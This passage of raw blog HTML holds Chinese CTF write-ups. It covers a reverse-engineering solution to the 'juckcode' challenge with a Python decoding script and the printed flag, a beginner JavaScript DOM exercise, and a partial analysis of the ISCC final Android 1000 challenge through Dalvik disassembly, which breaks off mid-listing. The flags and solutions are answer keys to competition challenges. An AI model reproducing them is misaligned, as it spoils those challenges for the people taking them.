class="keyword">char</span>&gt;&gt;(&amp;v36);</span><br><span class="line">  LOBYTE(v48) = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">std</span>::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::~basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;v40);</span><br><span class="line">  LOBYTE(v48) = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">std</span>::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::~basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;(&amp;input);</span><br><span class="line">  v48 = <span class="number">-1</span>;</span><br><span class="line">  sub_403870();</span><br><span class="line">  <span class="keyword">return</span> v20;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先判断了下文件是否读取成功,随后base64.base64encode大概的传参顺序是加密后的字符串,待加密的flag的首地址,flag的长度.大概的顺序就是:</p>
<ul>
<li>input加密一次</li>
<li>input每一位加64</li>
<li>input加密一次</li>
<li>input每一位再次右移7位</li>
<li>input加密一次</li>
<li>input每一位减去158</li>
<li>input加密一次</li>
</ul>
<p>这样会得到四个字符base64后的字符长度相同的字符串.随后到达</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(&amp;Dst, <span class="number">0</span>, <span class="number">0x3FF</span>u);</span><br><span class="line"><span class="keyword">for</span> ( l = <span class="number">0</span>; l &lt; len(&amp;v40); ++l )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( *sub_401C80(&amp;v40, l) != <span class="number">61</span> )</span><br><span class="line">    *(&amp;Src + <span class="number">4</span> * l) = *sub_401C80(&amp;v40, l);</span><br><span class="line">  </span><br><span class="line">  *(&amp;Dst + <span class="number">4</span> * l) = *sub_401C80(&amp;v36, l);</span><br><span class="line">  v47[<span class="number">4</span> * l] = *sub_401C80(&amp;v37, l);</span><br><span class="line">  *(&amp;v46 + <span class="number">4</span> * l) = *sub_401C80(&amp;v38, l);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>v36 v37 v38 v40是刚才base64的字符串</li>
<li>sub_401C80函数,是取下标操作,*sub_401C80(&amp;v37, l)的意思就是v37[l]</li>
<li>查看v47,v46,Dst,Src,发现其在栈内的分布是连续的四位</li>
<li>所以可以看出来,依次从四个base后的字符串中提取出一个,组成一个新的base后的字符串</li>
</ul>
<p>随后程序进行一次base64decode,将解码后的16进制转换成字符串,然后每一位减去16,打印出来.</p>
<h1 id="开始逆向"><a href="#开始逆向" class="headerlink" title="开始逆向"></a>开始逆向</h1><p>首先还原16进制,然后将其base64encode,提取出i%4==0的对应位,然后base64encode即可.<br>下面是解密代码:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">s = <span class="string">"FFIF@@IqqIH@sGBBsBHFAHH@FFIuB@tvrrHHrFuBD@qqqHH@GFtuB@EIqrHHCDuBsBqurHH@EuGuB@trqrHHCDuBsBruvHH@FFIF@@AHqrHHEEFBsBGtvHH@FBHuB@trqrHHADFBD@rquHH@FurF@@IqqrHHvGuBD@tCDHH@EuGuB@tvrrHHCDuBD@tCDHH@FuruB@tvrIH@@DBBsBGtvHH@GquuB@EIqrHHvGuBsBtGEHH@EuGuB@tvrIH@BDqBsBIFEHH@GFtF@@IqqrHHEEFBD@srBHH@GBsuB@trqrHHIFFBD@rquHH@FFIuB@tvrrHHtCDB@@"</span></span><br><span class="line">s1 = <span class="string">""</span></span><br><span class="line">base = <span class="string">'ABCDEFGHIJKLMN0PQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    s1 += (chr(ord(i) - <span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(s1) / <span class="number">2</span>):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line">        flag += base[int(s1[i * <span class="number">2</span>:i * <span class="number">2</span> + <span class="number">2</span>], base=<span class="number">16</span>) &gt;&gt; <span class="number">2</span>]</span><br><span class="line">flag += <span class="string">'='</span> * (<span class="number">4</span> - len(flag) % <span class="number">4</span>)</span><br><span class="line"><span class="keyword">print</span> base64.b64decode(flag)</span><br></pre></td></tr></table></figure>

<h2 id="flag-flag-juck-code-cannot-stop-you-reversing"><a href="#flag-flag-juck-code-cannot-stop-you-reversing" class="headerlink" title="flag: flag{juck_code_cannot_stop_you_reversing}"></a>flag: flag{juck_code_cannot_stop_you_reversing}</h2>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/07/29/juckcode/" data-id="cjyn83qfl0034icthmpmk7q33" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-javascript0x1" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/07/29/javascript0x1/" class="article-date">
  <time datetime="2019-07-28T17:11:01.690Z" itemprop="datePublished">2019-07-29</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/FE/">FE</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/07/29/javascript0x1/">javascript 0x00</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>实例代码:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>JavaScript练习<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"d"</span>&gt;</span></span><br><span class="line">JavaScript</span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">function myn()</span><br><span class="line">&#123;</span><br><span class="line">x=document.getElementById("d");  // 找到元素</span><br><span class="line">x.innerHTML="Hello JavaScript!";    // 改变内容</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">onclick</span>=<span class="string">"myn()"</span>&gt;</span>chance<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> &gt;</span>大黄的py<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"h"</span>&gt;</span>1<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> &gt;</span>mozhu的py<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"m"</span>&gt;</span>19<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">        function f()&#123;</span><br><span class="line">            var content = document.getElementById("h").innerHTML;</span><br><span class="line">            document.getElementById("h").innerHTML=Number(content) + 1;</span><br><span class="line">            var content = document.getElementById("m").innerHTML;</span><br><span class="line">            document.getElementById("m").innerHTML=Number(content) - 1;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span> = <span class="string">"button"</span> <span class="attr">onclick</span>=<span class="string">"f()"</span>&gt;</span>button<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/07/29/javascript0x1/" data-id="cjyn83qek0019icthz247o676" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-iscc安卓逆向" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/07/29/iscc安卓逆向/" class="article-date">
  <time datetime="2019-07-28T17:11:01.681Z" itemprop="datePublished">2019-07-29</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/RE/">RE</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/07/29/iscc安卓逆向/">ISCC 决赛 android 1000</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="iscc决赛android-1000"><a href="#iscc决赛android-1000" class="headerlink" title="iscc决赛android 1000"></a>iscc决赛android 1000</h1><h2 id="解题前序"><a href="#解题前序" class="headerlink" title="解题前序"></a>解题前序</h2><ul>
<li>查了一下apk内部,可以拿到一个.dex,一个.jar和两个.so</li>
<li>解.jar发现其实是一个加密的.dex,将dex转成jar以后发现checkflag的函数</li>
</ul>
<h2 id="分析checkflag函数"><a href="#分析checkflag函数" class="headerlink" title="分析checkflag函数"></a>分析checkflag函数</h2><ul>
<li>发现其中先定义了一个二维数组,然后将其传入一个enc函数,这个函数是反编译不出来的,应该是加了壳</li>
<li>后分析libcore.so函数,发现其中有一个函数名以及函数的操作很可疑,函数首先将一串加密过的字符串还原,然后经过几个类似于取解密后字符串中的括号括起来的部分,按照函数原有逻辑顺序解一下,发现了主要check函数的名字,后面还接了地址(0x159CBC)</li>
<li>根据地址定位函数,IDA中那块字节码是乱掉的,不能被翻译成汇编,所以现将其变成jar汇编,然后来分析汇编</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line">CODE:00159BCC # Method 0 (0x0)</span><br><span class="line">CODE:00159BCC                 .short 0xC              # Number of registers : 0xc</span><br><span class="line">CODE:00159BCE                 .short 1                # Size of input args (in words) : 0x1</span><br><span class="line">CODE:00159BD0                 .short 2                # Size of output args (in words) : 0x2</span><br><span class="line">CODE:00159BD2                 .short 0                # Number of try_items : 0x0</span><br><span class="line">CODE:00159BD4                 .int byte_3028B7        # Debug info</span><br><span class="line">CODE:00159BD8                 .int 0xBB               # Size of bytecode (in 16-bit units): 0xbb</span><br><span class="line">CODE:00159BDC # ---------------------------------------------------------------------------</span><br><span class="line">CODE:00159BDC                 const/4                         v10, 2</span><br><span class="line">CODE:00159BDE                 const/4                         v9, 1</span><br><span class="line">CODE:00159BE0                 const/4                         v8, 0</span><br><span class="line">CODE:00159BE2                 .prologue_end</span><br><span class="line">CODE:00159BE2                 .line 15</span><br><span class="line">CODE:00159BE2                 const/4                         v2, 0</span><br><span class="line">CODE:00159BE4                 .line 16</span><br><span class="line">CODE:00159BE4                 new-instance                    v0, &lt;t: StringBuilder&gt;</span><br><span class="line">CODE:00159BE8                 invoke-direct                   &#123;v0&#125;, &lt;void StringBuilder.&lt;init&gt;() imp. @ _def_StringBuilder__init_@V&gt;</span><br><span class="line">CODE:00159BEE                 .line 17</span><br><span class="line">CODE:00159BEE                 const/4                         v1, 0</span><br><span class="line">CODE:00159BF0</span><br><span class="line">CODE:00159BF0 loc_159BF0:                             # CODE XREF: CODE:00159D44↓j</span><br><span class="line">CODE:00159BF0                 invoke-virtual                  &#123;v11&#125;, &lt;int String.length() imp. @ _def_String_length@I&gt;</span><br><span class="line">CODE:00159BF6                 move-result                     v5</span><br><span class="line">CODE:00159BF8                 if-ge                           v1, v5, loc_159D48</span><br><span class="line">CODE:00159BFC                 .line 18</span><br><span class="line">CODE:00159BFC                 sget-object                     v5, ProtectedClass_key</span><br><span class="line">CODE:00159C00                 aget-object                     v5, v5, v8</span><br><span class="line">CODE:00159C04                 aget                            v5, v5, v8</span><br><span class="line">CODE:00159C08                 invoke-virtual                  &#123;v11, v1&#125;, &lt;char String.charAt(int) imp. @ _def_String_charAt@CI&gt;</span><br><span class="line">CODE:00159C0E                 move-result                     v6</span><br><span class="line">CODE:00159C10                 add-int/lit8                    v6, v6, -0x41</span><br><span class="line">CODE:00159C14                 mul-int/2addr                   v5, v6</span><br><span class="line">CODE:00159C16                 sget-object                     v6, ProtectedClass_key</span><br><span class="line">CODE:00159C1A                 aget-object                     v6, v6, v8</span><br><span class="line">CODE:00159C1E                 aget                            v6, v6, v9</span><br><span class="line">CODE:00159C22                 add-int/lit8                    v7, v1, 1</span><br><span class="line">CODE:00159C26                 .line 19</span><br><span class="line">CODE:00159C26                 invoke-virtual                  &#123;v11, v7&#125;, &lt;char String.charAt(int) imp. @ _def_String_charAt@CI&gt;</span><br><span class="line">CODE:00159C2C                 move-result                     v7</span><br><span class="line">CODE:00159C2E                 add-int/lit8                    v7, v7, -0x41</span><br><span class="line">CODE:00159C32                 mul-int/2addr                   v6, v7</span><br><span class="line">CODE:00159C34                 add-int/2addr                   v5, v6</span><br><span class="line">CODE:00159C36                 sget-object                     v6, ProtectedClass_key</span><br><span class="line">CODE:00159C3A                 aget-object                     v6, v6, v8</span><br><span class="line">CODE:00159C3E                 aget                            v6, v6, v10</span><br><span class="line">CODE:00159C42                 add-int/lit8                    v7, v1, 2</span><br><span class="line">CODE:00159C46                 .line 20</span><br><span class="line">CODE:00159C46                 invoke-virtual                  &#123;v11, v7&#125;, &lt;char String.charAt(int) imp. @ _def_String_charAt@CI&gt;</span><br><span class="line">CODE:00159C4C                 move-result                     v7</span><br><span class="line">CODE:00159C4E                 add-int/lit8                    v7, v7, -0x41</span><br><span class="line">CODE:00159C52                 mul-int/2addr                   v6, v7</span><br><span class="line">CODE:00159C54                 add-int                         v2, v5, v6</span><br><span class="line">CODE:00159C58                 .line 21</span><br><span class="line">CODE:00159C58                 sget-object                     v5, ProtectedClass_key</span><br><span class="line">CODE:00159C5C                 aget-object                     v5, v5, v9</span><br><span class="line">CODE:00159C60                 aget                            v5, v5, v8</span><br><span class="line">CODE:00159C64                 invoke-virtual                  &#123;v11, v1&#125;, &lt;char String.charAt(int) imp. @ _def_String_charAt@CI&gt;</span><br><span class="line">CODE:00159C6A                 move-result                     v6</span><br><span class="line">CODE:00159C6C                 add-int/lit8                    v6, v6, -0x41</span><br><span class="line">CODE:00159C70                 mul-int/2addr                   v5, v6</span><br><span class="line">CODE:00159C72                 sget-object                     v6, ProtectedClass_key</span><br><span class="line">CODE:00159C76                 aget-object                     v6, v6, v9</span><br><span class="line">CODE:00159C7A                 aget                            v6, v6, v9</span><br><span class="line">CODE:00159C7E                 add-int/lit8                    v7, v1, 1</span><br><span class="line">CODE:00159C82                 .line 22</span><br><span class="line">CODE:00159C82                 invoke-virtual                  &#123;v11, v7&#125;, &lt;char String.charAt(int) imp. @ _def_String_charAt@CI&gt;</span><br><span class="line">CODE:00159C88                 move-result                     v7</span><br><span class="line">CODE:00159C8A                 add-int/lit8                    v7, v7, -0x41</span><br><span class="line">CODE:00159C8E                 mul-int/2addr                   v6, v7</span><br><span class="line">CODE:00159C90                 add-int/2addr                   v5, v6</span><br><span class="line">CODE:00159C92                 sget-object                     v6, ProtectedClass_key</span><br><span class="line">CODE:00159C96                 aget-object                     v6, v6, v9</span><br><span class="line">CODE:00159C9A                 aget                            v6, v6, v10</span><br><span class="line">CODE:00159C9E                 add-int/lit8                    v7, v1, 2</span><br><span class="line">CODE:00159CA2                 .line 23</span><br><span class="line">CODE:00159CA2                 invoke-virtual                  &#123;v11, v7&#125;, &lt;char String.charAt(int) imp. @ _def_String_charAt@CI&gt;</span><br><span class="line">CODE:00159CA8                 move-result                     v7</span><br><span class="line">CODE:00159CAA                 add-int/lit8                    v7, v7, -0x41</span><br><span class="line">CODE:00159CAE                 mul-int/2addr                   v6, v7</span><br><span class="line">CODE:00159CB0                 add-int                         v3, v5, v6</span><br><span class="line">CODE:00159CB4                 .line 24</span><br><span class="line">CODE:00159CB4                 sget-object                     v5, ProtectedClass_key</span><br><span class="line">CODE:00159CB8                 aget-object                     v5, v5, v10</span><br><span class="line">CODE:00159CBC                 aget                            v5, v5, v8</span><br><span class="line">CODE:00159CC0                 invoke-virtual                  &#123;v11, v1&#125;, &lt;char String.charAt(int) imp. @ _def_String_charAt@CI&gt;</span><br><span class="line">CODE:00159CC6                 move-result                     v6</span><br><span class="line">CODE:00159CC8                 add-int/lit8                    v6, v6, -0x41</span><br><span class="line">CODE:00159CCC                 mul-int/2addr                   v5, v6</span><br><span class="line">CODE:00159CCE                 sget-object                     v6, ProtectedClass_key</span><br><span class="line">CODE:00159CD2                 aget-object                     v6, v6, v10</span><br><span class="line">CODE:00159CD6                 aget                            v6, v6, v9</span><br><span class="line">CODE:00159CDA                 add-int/lit8                    v7, v1, 1</span><br><span class="line">CODE:00159CDE                 .line 25</span><br><span class="line">CODE:00159CDE                 invoke-virtual                  &#123;v11, v7&#125;, &lt;char String.charAt(int) imp. @ _def_String_charAt@CI&gt;</span><br><span class="line">CODE:00159CE4                 move-result                     v7</span><br><span class="line">CODE:00159CE6                 add-int/lit8                    v7, v7, -0x41</span><br><span class="line">CODE:00159CEA                 mul-int/2addr                   v6, v7</span><br><span class="line">CODE:00159CEC                 add-int/2addr                   v5, v6</span><br><span class="line">CODE:00159CEE                 sget-object                     v6, ProtectedClass_key</span><br><span class="line">CODE:00159CF2                 aget-object                     v6, v6, v10</span><br><span class="line">CODE:00159CF6                 aget                            v6, v6, v10</span><br><span class="line">CODE:00159CFA                 add-int/lit8                    v7, v1, 2</span><br><span class="line">CODE:00159CFE                 .line 26</span><br><span class="line">CODE:00159CFE                 invoke-virtual                  &#123;v11, v7&#125;, &lt;char String.charAt(int) imp. @ _def_String_charAt@CI&gt;</span><br><span class="line">CODE:00159D04                 move-result                     v7</span><br><span class="line">CODE:00159D06                 add-int/lit8                    v7, v7, -0x41</span><br><span class="line">CODE:00159D0A                 mul-int/2addr                   v6, v7</span><br><span class="line">CODE:00159D0C                 add-int                         v4, v5, v6</span><br><span class="line">CODE:00159D10                 .line 27</span><br><span class="line">CODE:00159D10                 rem-int/lit8                    v5, v2, 0x1A</span><br><span class="line">CODE:00159D14                 add-int/lit8                    v5, v5, 0x41</span><br><span class="line">CODE:00159D18                 int-to-char                     v5, v5</span><br><span class="line">CODE:00159D1A                 invoke-virtual                  &#123;v0, v5&#125;, &lt;ref StringBuilder.append(char) imp. @ _def_StringBuilder_append@LC&gt;</span><br><span class="line">CODE:00159D20                 .line 28</span><br><span class="line">CODE:00159D20                 rem-int/lit8                    v5, v3, 0x1A</span><br><span class="line">CODE:00159D24                 add-int/lit8                    v5, v5, 0x41</span><br><span class="line">CODE:00159D28                 int-to-char                     v5, v5</span><br><span class="line">CODE:00159D2A                 invoke-virtual                  &#123;v0, v5&#125;, &lt;ref StringBuilder.append(char) imp. @ _def_StringBuilder_append@LC&gt;</span><br><span class="line">CODE:00159D30                 .line 29</span><br><span class="line">CODE:00159D30                 rem-int/lit8                    v5, v4, 0x1A</span><br><span class="line">CODE:00159D34                 add-int/lit8                    v5, v5, 0x41</span><br><span class="line">CODE:00159D38                 int-to-char                     v5, v5</span><br><span class="line">CODE:00159D3A                 invoke-virtual                  &#123;v0, v5&#125;, &lt;ref StringBuilder.append(char) imp. @ _def_StringBuilder_append@LC&gt;</span><br><span class="line">CODE:00159D40                 .line 17</span><br><span class="line">CODE:00159D40                 add-int/lit8                    v1, v1, 3</span><br><span class="line">CODE:00159D44                 goto/16                         loc_159BF0</span><br><span class="line">CODE:00159D48 # ---------------------------------------------------------------------------</span><br><span class="line">CODE:00159D48 .end local &apos;temp2&apos;</span><br><span class="line">CODE:00159D48 .end local &apos;temp3&apos;</span><br><span class="line">CODE:00159D48</span><br><span class="line">CODE:00159D48 loc_159D48:                             # CODE XREF: CODE:00159BF8↑j</span><br><span class="line">CODE:00159D48                 .line 32</span><br><span class="line">CODE:00159D48                 invoke-virtual                  &#123;v0&#125;, &lt;ref StringBuilder.toString() imp. @ _def_StringBuilder_toString@L&gt;</span><br><span class="line">CODE:00159D4E                 move-result-object              v5</span><br><span class="line">CODE:00159D50                 return-object                   v5</span><br><span class="line">CODE:00159D50 # ---------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>

<ul>
<li>分析一下函数主要逻辑</li>
<li>函数首先给v8 v9 v10函数分别赋值0 1 2</li>
<li>然后程序分配了一块内存来作为输出</li>
<li>然后函数进入了一轮循环,大体上来看,函数是以字符串长度和循环下标来作为判断,循环尾部会给i每次递增三</li>
<li>细分析循环内部逻辑,这一段大概有9段类似的结构,选取其中的第一块来分析</li>
<li>首先获取二维数组key的地址,然后以此加上两个常量,这个常量就是之前提到过的v8 v9 v10,这里猜测为key[x][y]中的x,y</li>
<li>扫了一眼后面的指令,取常量的顺序依次是00,01,02,10,11,12,20,21,22可以确定,这个操作就是在取key对应的xy的值</li>
<li>随后函数又从input里面取值,{input,i}这样的取值方式取值后,将所取值减去65,值得注意的是寄存器v7,后续取值操作不再是{input,i},而是{input,v7}(其中v7 = i + 1或2),这就可以解释为什么i += 3了</li>
<li>依次进行这些操作以后,函数会将每一组(共三组)算得的值%26 + 65,append进入刚开始申请的的空间,最后输出函数,下面是我部分化简过一部分的汇编指令</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span 